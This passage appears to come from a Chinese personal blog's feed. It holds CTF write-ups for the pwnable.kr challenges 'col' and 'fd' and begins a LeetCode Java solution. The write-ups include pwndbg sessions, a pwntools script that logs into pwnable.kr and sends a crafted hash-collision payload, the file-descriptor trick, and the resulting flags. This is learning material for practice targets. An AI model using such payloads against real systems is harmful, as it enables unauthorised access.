class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; break main</span><br><span class="line">Breakpoint 1 at 0x80484d1</span><br><span class="line">pwndbg&gt; r &#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span><br><span class="line">Starting program: /home/poem/Desktop/workplace/col &#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080484d1 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x80484cd (main) ◂— push   ebp</span><br><span class="line"> EBX  0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac</span><br><span class="line"> ECX  0x58615ad</span><br><span class="line"> EDX  0xffffd170 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac</span><br><span class="line"> EDI  0xffffd220 —▸ 0xffffd3ff ◂— &#x27;SYSTEMD_EXEC_PID=3216&#x27;</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffd148 ◂— 0x0</span><br><span class="line"> ESP  0xffffd144 —▸ 0xffffd220 —▸ 0xffffd3ff ◂— &#x27;SYSTEMD_EXEC_PID=3216&#x27;</span><br><span class="line"> EIP  0x80484d1 (main+4) ◂— and    esp, 0xfffffff0</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80484d1 &lt;main+4&gt;     and    esp, 0xfffffff0</span><br><span class="line">   0x80484d4 &lt;main+7&gt;     sub    esp, 0x90</span><br><span class="line">   0x80484da &lt;main+13&gt;    mov    eax, dword ptr [ebp + 0xc]</span><br><span class="line">   0x80484dd &lt;main+16&gt;    mov    dword ptr [esp + 0x1c], eax</span><br><span class="line">   0x80484e1 &lt;main+20&gt;    mov    eax, dword ptr gs:[0x14]</span><br><span class="line">   0x80484e7 &lt;main+26&gt;    mov    dword ptr [esp + 0x8c], eax</span><br><span class="line">   0x80484ee &lt;main+33&gt;    xor    eax, eax</span><br><span class="line">   0x80484f0 &lt;main+35&gt;    cmp    dword ptr [ebp + 8], 1</span><br><span class="line">   0x80484f4 &lt;main+39&gt;    jg     main+71                     &lt;main+71&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048514 &lt;main+71&gt;    mov    eax, dword ptr [esp + 0x1c]</span><br><span class="line">   0x8048518 &lt;main+75&gt;    add    eax, 4</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd144 —▸ 0xffffd220 —▸ 0xffffd3ff ◂— &#x27;SYSTEMD_EXEC_PID=3216&#x27;</span><br><span class="line">01:0004│ ebp 0xffffd148 ◂— 0x0</span><br><span class="line">02:0008│     0xffffd14c —▸ 0xf7da24ca (__libc_start_call_main+122) ◂— add    esp, 0x10</span><br><span class="line">03:000c│     0xffffd150 ◂— 0x2</span><br><span class="line">04:0010│     0xffffd154 —▸ 0xffffd214 —▸ 0xffffd3c9 ◂— &#x27;/home/poem/Desktop/workplace/col&#x27;</span><br><span class="line">05:0014│     0xffffd158 —▸ 0xffffd220 —▸ 0xffffd3ff ◂— &#x27;SYSTEMD_EXEC_PID=3216&#x27;</span><br><span class="line">06:0018│     0xffffd15c —▸ 0xffffd170 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac</span><br><span class="line">07:001c│     0xffffd160 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0x80484d1 main+4</span><br><span class="line">   f 1 0xf7da24ca __libc_start_call_main+122</span><br><span class="line">   f 2 0xf7da25aa __libc_start_main+154</span><br><span class="line">   f 3 0x8048401 _start+33</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; disass check_password</span><br><span class="line">Dump of assembler code for function check_password:</span><br><span class="line">   0x08048494 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x08048495 &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x08048497 &lt;+3&gt;:sub    esp,0x10</span><br><span class="line">   0x0804849a &lt;+6&gt;:mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x0804849d &lt;+9&gt;:mov    DWORD PTR [ebp-0x4],eax</span><br><span class="line">   0x080484a0 &lt;+12&gt;:mov    DWORD PTR [ebp-0x8],0x0</span><br><span class="line">   0x080484a7 &lt;+19&gt;:mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">   0x080484ae &lt;+26&gt;:jmp    0x80484c2 &lt;check_password+46&gt;</span><br><span class="line">   0x080484b0 &lt;+28&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484b3 &lt;+31&gt;:shl    eax,0x2</span><br><span class="line">   0x080484b6 &lt;+34&gt;:add    eax,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x080484b9 &lt;+37&gt;:mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x080484bb &lt;+39&gt;:add    DWORD PTR [ebp-0x8],eax</span><br><span class="line">   0x080484be &lt;+42&gt;:add    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">   0x080484c2 &lt;+46&gt;:cmp    DWORD PTR [ebp-0xc],0x4</span><br><span class="line">   0x080484c6 &lt;+50&gt;:jle    0x80484b0 &lt;check_password+28&gt;</span><br><span class="line">   0x080484c8 &lt;+52&gt;:mov    eax,DWORD PTR [ebp-0x8]</span><br><span class="line">   0x080484cb &lt;+55&gt;:leave  </span><br><span class="line">   0x080484cc &lt;+56&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; break 0x080484cc</span><br><span class="line">Function &quot;0x080484cc&quot; not defined.</span><br><span class="line">pwndbg&gt; break *0x080484cc</span><br><span class="line">Breakpoint 2 at 0x80484cc</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x080484cc in check_password ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x46464645 (&#x27;EFFF&#x27;)</span><br><span class="line"> EBX  0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac</span><br><span class="line">*ECX  0xffffffea</span><br><span class="line">*EDX  0xffffd3ea ◂— &#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span><br><span class="line">*EDI  0xffffd3ff ◂— &#x27;SYSTEMD_EXEC_PID=3216&#x27;</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffd148 ◂— 0x0</span><br><span class="line">*ESP  0xffffd0ac —▸ 0x8048564 (main+151) ◂— mov    edx, dword ptr [0x804a020]</span><br><span class="line">*EIP  0x80484cc (check_password+56) ◂— ret    </span><br><span class="line">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80484cc &lt;check_password+56&gt;    ret                                  &lt;0x8048564; main+151&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048564 &lt;main+151&gt;             mov    edx, dword ptr [hashcode]     &lt;0x804a020&gt;</span><br><span class="line">   0x804856a &lt;main+157&gt;             cmp    eax, edx</span><br><span class="line">   0x804856c &lt;main+159&gt;             jne    main+180                     &lt;main+180&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048581 &lt;main+180&gt;             mov    dword ptr [esp], 0x80486c9</span><br><span class="line">   0x8048588 &lt;main+187&gt;             call   puts@plt                     &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x804858d &lt;main+192&gt;             mov    eax, 0</span><br><span class="line">   0x8048592 &lt;main+197&gt;             mov    edx, dword ptr [esp + 0x8c]</span><br><span class="line">   0x8048599 &lt;main+204&gt;             xor    edx, dword ptr gs:[0x14]</span><br><span class="line">   0x80485a0 &lt;main+211&gt;             je     main+218                     &lt;main+218&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485a2 &lt;main+213&gt;             call   __stack_chk_fail@plt                     &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd0ac —▸ 0x8048564 (main+151) ◂— mov    edx, dword ptr [0x804a020]</span><br><span class="line">01:0004│     0xffffd0b0 —▸ 0xffffd3ea ◂— &#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span><br><span class="line">02:0008│     0xffffd0b4 —▸ 0xf7ffdb98 —▸ 0xf7ffdb30 —▸ 0xf7fc13f0 —▸ 0xf7ffd9d0 ◂— ...</span><br><span class="line">03:000c│     0xffffd0b8 —▸ 0xffffd134 ◂— 0xffffffff</span><br><span class="line">04:0010│     0xffffd0bc ◂— 0xf63d4e2e</span><br><span class="line">05:0014│     0xffffd0c0 —▸ 0x8048299 ◂— pop    edi /* &#x27;__libc_start_main&#x27; */</span><br><span class="line">06:0018│     0xffffd0c4 —▸ 0xf7fd4dbc (_dl_lookup_symbol_x+284) ◂— add    esp, 0x30</span><br><span class="line">07:001c│     0xffffd0c8 ◂— 0xffffffff</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 0x80484cc check_password+56</span><br><span class="line">   f 1 0x8048564 main+151</span><br><span class="line">   f 2 0xf7da24ca __libc_start_call_main+122</span><br><span class="line">   f 3 0xf7da25aa __libc_start_main+154</span><br><span class="line">   f 4 0x8048401 _start+33</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; print $eax</span><br><span class="line">$1 = 1179010629</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>然后解释一下这个eax的值，eax寄存器应该是作为，c语言返回值临时存储的地方的。这里出现<code>$1 = 1179010629</code>似乎是因为没有格式化输出，那个太麻烦了，其实这个eax寄存器内的值应该就是<code>1179010629 =&gt; 0x46464645</code>了。本来应该是<code>0x146464645</code>的似乎，因为<code>0x41414141 * 5 == 0x146464645</code>，但是不知道为什么这个第九位的1没了，原谅菜鸟吧！</p><p>那很容易就得出了这个结果，我们需要把我们输入的passcode每四个为一组，五组加一块的值为hashcode的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hashcode = 0x21DD09EC;</span><br><span class="line"></span><br><span class="line">转成int为：</span><br><span class="line">568134124</span><br><span class="line"></span><br><span class="line">除以5为：</span><br><span class="line">568134124 = 113626824 * 4 + 113626828</span><br><span class="line"></span><br><span class="line">转成hex为：</span><br><span class="line">0x6C5CEC8 * 4 + 0x6C5CECC</span><br><span class="line"></span><br><span class="line">然后转成字符就是</span><br><span class="line">&quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;</span><br></pre></td></tr></table></figure><p>然后我们尝试使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot;</span><br></pre></td></tr></table></figure><p>但未果，因为c不会把上面的这些当作byte，只会当作一个个的字符来看，这题我们需要使用pwntools来解决。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x6C5CEC8</span>) * <span class="number">4</span> + p32(<span class="number">0x6C5CECC</span>)</span><br><span class="line">client = ssh(<span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, password=<span class="string">&#x27;guest&#x27;</span>, port=<span class="number">2222</span>)</span><br><span class="line">p = client.process(executable=<span class="string">&#x27;./col&#x27;</span>, argv=[<span class="string">&#x27;col&#x27;</span>, payload])  <span class="comment"># 执行： ./col payload</span></span><br><span class="line"></span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.close()</span><br><span class="line">client.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] col@pwnable.kr:</span><br><span class="line">    Distro    Ubuntu 16.04</span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  4.4.179</span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[x] Starting remote process bytearray(b&#x27;./col&#x27;) on pwnable.kr</span><br><span class="line">[+] Starting remote process bytearray(b&#x27;./col&#x27;) on pwnable.kr: pid 295173</span><br><span class="line">b&#x27;daddy! I just managed to create a hash collision :)\n&#x27;</span><br><span class="line">[*] Stopped remote process &#x27;col&#x27; on pwnable.kr (pid 295173)</span><br><span class="line">[*] Closed connection to &#x27;pwnable.kr&#x27;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、一、fd</title>
      <link href="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd/"/>
      <url>/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd/</url>
      
        <content type="html"><![CDATA[<h3 id="一、fd"><a href="#一、fd" class="headerlink" title="一、fd"></a>一、fd</h3><p>​This challenge is for the rookie. We should first connect the challenge machine. I capture a screenshot:</p><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220514233340148.png" alt="image-20220514233340148"></p><p>​不用英文写了，这篇文章到时候可能自己还要看，到时候再慢慢嚼不值当。下面开始用中文写，还是首先应当学会走路，再开始学跑步就会事半功倍了。</p><p>​连接远程服务器这个我就不再赘述了，连上之后，这个pwn的作用应该是提升本地权限的。首先<code>ls -l</code>注意到flag文件的权限应该是不对<code>fd</code>用户开放的。</p><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220514234353931.png" alt="image-20220514234353931"></p><p>​故而我们需要下载下来那个<code>fd</code>和<code>fd.c</code>文件，逆向分析并且漏洞利用之后才能成功读取<code>flag</code>。</p><p>final shell终端管理工具连接一波，并且把两个文件也下载一下：</p><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220514234952570.png" alt="image-20220514234952570"></p><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220514235031289.png" alt="image-20220514235031289"></p><p>​然后打开看看c代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​分析一下主要逻辑，我们需要让buf的内容为<code>LETMEWIN\n</code>，然后上面正好有个<code>read()函数</code>，<code>read()函数</code>的第一个参数fd的情况有三种：</p><ol start="0"><li>stdin标准输入</li><li>stdout 标准输出</li><li>stderr 标准错误</li></ol><p>虽然我不太懂最后一个，但是前面的两个我还是知道的。我们需要让fd的值为0，之后我们就能直接输入，我们想让buf的值为什么就都可以了。那这道题目就直接在目标机器的命令行里面输入</p><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220515000533036.png" alt="image-20220515000533036"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./fd 4660</span><br><span class="line"></span><br><span class="line"># after that, input &#x27;LETMEWIN&#x27;. And press the &#x27;enter&#x27; key is ok.</span><br></pre></td></tr></table></figure><p><img src="/2022/05/14/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80%E3%80%81fd//image-20220515000818223.png" alt="image-20220515000818223"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><p>出这题目的人太搞了吧。</p>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode_Java题解、一</title>
      <link href="/2022/05/12/leetcode-Java%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80/"/>
      <url>/2022/05/12/leetcode-Java%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h3 id="1、两数之和"><a href="#1、两数之和" class="headerlink" title="1、两数之和"></a>1、两数之和</h3><p><img src="/2022/05/12/leetcode-Java%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%80//image-20220512093143846.png" alt="image-20220512093143846"></p><p>自己写的太拉垮了，看了别人的题解，学到了，但是基本上没做出什么改变，直接从左到右按位加就行了。某链表为null时，该位上的元素值使用0代替，相加再加上进位标志位，最后如果最后一位有进位的话，在最后再加一个1。</p><p>最后，因为头结点的元素值为0，多余，故将单链表后移一位<code>res = res.next;</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cflag</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//进位标志位</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(); <span class="comment">//创建结果链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> res;  <span class="comment">// 尾指针</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">null</span> || l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> l1 == <span class="literal">null</span> ? <span class="number">0</span> : l1.val;  <span class="comment">//取0或该位的值</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> l2 == <span class="literal">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> x + y + cflag;          <span class="comment">// 加上进位标志位</span></span><br><span class="line">                cflag = sum / <span class="number">10</span>;  <span class="comment">// 进位标志位</span></span><br><span class="line">                sum = sum % <span class="number">10</span>;    <span class="comment">// 取相加的个位结果</span></span><br><span class="line">                <span class="comment">//System.out.println(sum);</span></span><br><span class="line"></span><br><span class="line">             </span><br><span class="line">                tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum);  <span class="comment">// 待插入节点</span></span><br><span class="line">                tail = tail.next;</span><br><span class="line">                <span class="keyword">if</span>(l1 != <span class="literal">null</span>)</span><br><span class="line">                    l1 = l1.next;</span><br><span class="line">                <span class="keyword">if</span>(l2 != <span class="literal">null</span>)</span><br><span class="line">                    l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cflag == <span class="number">1</span>)&#123;</span><br><span class="line">                    tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(cflag);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = res.next;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、无重复字符的最长子串"><a href="#2、无重复字符的最长子串" class="headerlink" title="2、无重复字符的最长子串"></a>2、无重复字符的最长子串</h3><p>借鉴别人题解，第一次了解java中的HashMap这个类型，相当于一个字典，由key-value组成，key不可以重复，value可以重复。</p><p>本题是一道滑动窗口类型的题目，顾名思义，就是先设置两个哨兵，分别在起始和末尾，起始的哨兵不懂，末尾哨兵右移。当末尾的字符与前面的字符出现重复了之后，将起始位置的哨兵改到重复的字符的第一个位置的下一个位置，并记下字符串的长度max。后面继续上面的操作即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//创建hashmap字典</span></span><br><span class="line">HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>, start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt; s.length(); end++) &#123;</span><br><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(end);</span><br><span class="line"><span class="keyword">if</span> (map.containsKey(ch)) &#123;</span><br><span class="line">start = Math.max(start, map.get(ch)+<span class="number">1</span>);  <span class="comment">// 更改初始位置为重复的那个字符的下一位、或者start比较大时，匹配过前，故取其中的较大值。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">            